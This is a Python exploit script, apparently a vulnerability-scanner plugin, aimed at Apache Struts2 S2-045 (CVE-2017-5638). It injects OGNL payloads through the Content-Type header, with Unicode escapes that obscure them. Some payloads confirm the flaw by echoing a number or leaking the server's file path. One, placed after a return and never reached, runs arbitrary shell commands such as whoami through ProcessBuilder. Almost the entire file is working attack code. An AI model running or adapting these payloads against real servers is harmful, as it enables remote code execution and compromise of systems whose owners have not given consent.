import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'Apache Struts2 S2-045 远程代码执行漏洞 (CVE-2017-5638)'


def run(url):
    headers = {
    'Content-Type':'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    try:
        headers['Content-Type'] = "smultipart/form-data%{(#dm=@\u006fgnl.OgnlC\u006fntext@DEF\u0041ULT_MEMBER_\u0041CCESS).(#_member\u0041ccess?(#_member\u0041ccess=#dm):((#c\u006fntainer=#c\u006fntext['c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u0041cti\u006fnC\u006fntext.c\u006fntainer']).(#\u006fgnlUtil=#c\u006fntainer.getInstance(@c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u006fgnl.OgnlUtil@class)).(#\u006fgnlUtil.getExcludedPackageNames().clear()).(#\u006fgnlUtil.getExcludedClasses().clear()).(#c\u006fntext.setMember\u0041ccess(#dm)))).(#r\u006fs=(@\u006frg.apache.struts2.Servlet\u0041cti\u006fnC\u006fntext@getResp\u006fnse().getWriter())).(#r\u006fs.print(1*102450)).(#r\u006fs.flush()).(#r\u006fs.cl\u006fse())}"
        response = requests.get(url, headers=headers, timeout=15, verify=False)
        if '102450' in response.text and 'echo' not in response.text:
            return ['True',name,url]
        else:
            host = urlparse(url)
            url = f"{host.scheme}://{host.netloc}"
            try:
                vulurl = url + '/?&'
                # patch
                headers['Content-Type'] = "smultipart/form-data%{(#dm=@\u006fgnl.OgnlC\u006fntext@DEF\u0041ULT_MEMBER_\u0041CCESS).(#_member\u0041ccess?(#_member\u0041ccess=#dm):((#c\u006fntainer=#c\u006fntext['c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u0041cti\u006fnC\u006fntext.c\u006fntainer']).(#\u006fgnlUtil=#c\u006fntainer.getInstance(@c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u006fgnl.OgnlUtil@class)).(#\u006fgnlUtil.getExcludedPackageNames().clear()).(#\u006fgnlUtil.getExcludedClasses().clear()).(#c\u006fntext.setMember\u0041ccess(#dm)))).(#req=#c\u006fntext.get('c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.dispatcher.HttpServletRequest')).(#r\u006fs=(@\u006frg.apache.struts2.Servlet\u0041cti\u006fnC\u006fntext@getResp\u006fnse().getWriter())).(#r\u006fs.print(#req.getRealPath('/'))).(#r\u006fs.flush()).(#r\u006fs.cl\u006fse())}"
                # poc
                headers['Content-Type'] = "smultipart/form-data%{(#dm=@\u006fgnl.OgnlC\u006fntext@DEF\u0041ULT_MEMBER_\u0041CCESS).(#_member\u0041ccess?(#_member\u0041ccess=#dm):((#c\u006fntainer=#c\u006fntext['c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u0041cti\u006fnC\u006fntext.c\u006fntainer']).(#\u006fgnlUtil=#c\u006fntainer.getInstance(@c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u006fgnl.OgnlUtil@class)).(#\u006fgnlUtil.getExcludedPackageNames().clear()).(#\u006fgnlUtil.getExcludedClasses().clear()).(#c\u006fntext.setMember\u0041ccess(#dm)))).(#r\u006fs=(@\u006frg.apache.struts2.Servlet\u0041cti\u006fnC\u006fntext@getResp\u006fnse().getWriter())).(#r\u006fs.print(1*102450)).(#r\u006fs.flush()).(#r\u006fs.cl\u006fse())}"
                response = requests.get(vulurl, headers=headers, timeout=15, verify=False)
                if '102450' in response.text and 'echo' not in response.text:
                    return ['True',name,vulurl]
                else:
                    return ['False',name]
                
                # whoami
                vulurl = url + '/?&&encode=iso-8859-1&cmd=whoami'
                headers['Content-Type'] = "smultipart/form-data%{(#dm=@\u006fgnl.OgnlC\u006fntext@DEF\u0041ULT_MEMBER_\u0041CCESS).(#_member\u0041ccess?(#_member\u0041ccess=#dm):((#c\u006fntainer=#c\u006fntext['c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u0041cti\u006fnC\u006fntext.c\u006fntainer']).(#\u006fgnlUtil=#c\u006fntainer.getInstance(@c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.\u006fgnl.OgnlUtil@class)).(#\u006fgnlUtil.getExcludedPackageNames().clear()).(#\u006fgnlUtil.getExcludedClasses().clear()).(#c\u006fntext.setMember\u0041ccess(#dm)))).(#req=#c\u006fntext.get('c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.dispatcher.HttpServletRequest')).(#hh=#c\u006fntext.get('c\u006fm.\u006fpensymph\u006fny.xw\u006frk2.dispatcher.HttpServletResp\u006fnse')).(#\u006fsname=@java.lang.System@getPr\u006fperty('\u006fs.name')).(#list=#\u006fsname.startsWith('Wind\u006fws')?{'cmd.exe','/c',#parameters.cmd[0]}:{'/bin/bash','-c',#parameters.cmd[0]}).(#aa=(new java.lang.Pr\u006fcessBuilder(#list)).start()).(#bb=#aa.getInputStream()).(#hh.getWriter().println(new java.lang.String(new \u006frg.apache.c\u006fmm\u006fns.i\u006f.IOUtils().t\u006fByte\u0041rray(#bb),#parameters.enc\u006fde))?true:true).(#hh.getWriter().flush()).(#hh.getWriter().cl\u006fse())}"
                response = requests.get(vulurl, headers=headers, timeout=15, verify=False)
            except Exception as e:
                return ['False2',name]
    except Exception as e:
        return ['False3',name]

if __name__ == '__main__':
    url = 'http://172.27.0.171:55018/'
    print(run(url))